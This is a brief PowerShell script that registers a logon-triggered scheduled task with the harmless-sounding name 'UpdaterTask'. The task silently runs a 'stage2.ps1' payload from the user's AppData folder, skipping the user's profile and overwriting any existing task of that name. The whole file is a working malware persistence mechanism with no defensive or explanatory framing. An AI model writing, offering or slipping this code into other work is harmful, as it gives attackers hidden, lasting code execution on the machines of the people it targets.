
[CmdletBinding()]
param(
    [string]$TaskName = "UpdaterTask",
    [string]$ScriptPath = "$env:APPDATA\stage2.ps1"
)
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument ("-NoP -File `"" + $ScriptPath + "`"")
Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
